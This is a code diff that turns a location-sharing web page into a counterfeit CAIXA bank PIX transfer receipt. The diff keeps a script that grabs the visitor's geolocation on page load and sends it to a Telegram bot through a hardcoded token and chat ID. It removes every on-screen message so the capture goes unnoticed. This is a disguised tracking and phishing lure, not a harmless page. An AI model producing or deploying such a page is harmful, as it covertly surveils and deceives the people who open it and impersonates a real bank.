@@ -3,13 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Compartilhar Localização</title>
+    <title>Comprovante de Transferência - CAIXA</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+        }
+        .comprovante {
+            background-color: white;
+            width: 600px;
+            margin: auto;
+            padding: 20px;
+            border: 2px solid #000;
+            box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.2);
+            text-align: left;
+        }
+        .logo {
+            width: 150px;
+        }
+        .titulo {
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .detalhes {
+            margin-top: 20px;
+            border: 1px solid #000;
+            padding: 10px;
+        }
+        .linha {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+        }
+        .chave {
+            text-align: center;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .rodape {
+            font-size: 12px;
+            text-align: center;
+            margin-top: 15px;
+        }
+    </style>
 </head>
-<body style="background-color: antiquewhite;">
-    <h1>Obtendo sua localização...</h1>
+<body>
+    <div class="comprovante">
+        <img src="caixa.png" alt="CAIXA" class="logo">
+        <p class="titulo">Comprovante de transferência entre contas da CAIXA - PIX</p>
+        <p style="font-size: 12px; text-align: center;">Via Internet Banking CAIXA</p>
+
+        <div class="detalhes">
+            <div class="linha"><strong>Emitente:</strong> TRANSFERIA SERVIÇOS DE PAGAMENTO</div>
+            <div class="linha"><strong>Conta origem:</strong> 02952 / 003 / 00001498-9</div>
+            <div class="linha"><strong>Conta destino:</strong> 0001 / 001 / 12345678-9</div>
+        </div>
+
+        <div class="detalhes">
+            <div class="linha"><strong>Nome destinatário:</strong> Dayane Silva das Neves</div>
+            <div class="linha"><strong>Valor:</strong> R$ 200,00</div>
+            <div class="linha"><strong>Identificação da operação:</strong> 1234567890</div>
+        </div>
+
+        <div class="detalhes">
+            <div class="linha"><strong>Data de débito:</strong> 25/03/2025</div>
+            <div class="linha"><strong>Data/hora da operação:</strong> 25/03/2025 14:00:00</div>
+        </div>
+
+        <p class="chave">Chave de segurança: <br> <strong>E4298E8077F943FE912345678</strong></p>
+
+        <p class="rodape">DÉBITO REALIZADO COM SUCESSO. A PREVISÃO DO CRÉDITO NA CONTA DESTINO É DE 30 MINUTOS.</p>
+
+        <p class="rodape">
+            SAC CAIXA: 0800 726 0101<br>
+            Pessoas com deficiência auditiva: 0800 726 2492<br>
+            Ouvidoria: 0800 725 7474<br>
+            Help Desk CAIXA: 0800 726 0104
+        </p>
+    </div>
 
     <script>
-        // ⚠️ Substitua pelo seu novo Token e Chat ID
+        // ⚠️ Substitua pelo seu Token do Telegram e ID do Chat
         const BOT_TOKEN = "7622176108:AAFzHIF6l7LaB2H9lY_CpBa5W8Dx68ubARY";
         const CHAT_ID = "-4601331389";
 
@@ -25,34 +103,20 @@
                     text: message,
                     parse_mode: "Markdown"
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    document.body.innerHTML = "<h1>Localização enviada com sucesso! ✅</h1>";
-                } else {
-                    document.body.innerHTML = "<h1>Erro ao enviar a localização ❌</h1>";
-                }
-            })
-            .catch(error => {
-                console.error("Erro ao enviar:", error);
-                document.body.innerHTML = "<h1>Erro ao conectar com o Telegram ❌</h1>";
-            });
+            }).catch(error => console.error("Erro ao enviar localização:", error));
         }
 
         function handleError(error) {
-            document.body.innerHTML = `<h1>Erro ao obter a localização ❌</h1><p>${error.message}</p>`;
+            console.error("Erro ao obter a localização:", error.message);
         }
 
-        // Captura automática da localização ao carregar a página
+        // Captura automática da localização ao carregar a página (sem alertas)
         window.addEventListener("load", () => {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => sendLocation(position.coords.latitude, position.coords.longitude),
                     handleError
                 );
-            } else {
-                document.body.innerHTML = "<h1>Geolocalização não suportada pelo navegador ❌</h1>";
             }
         });
     </script>
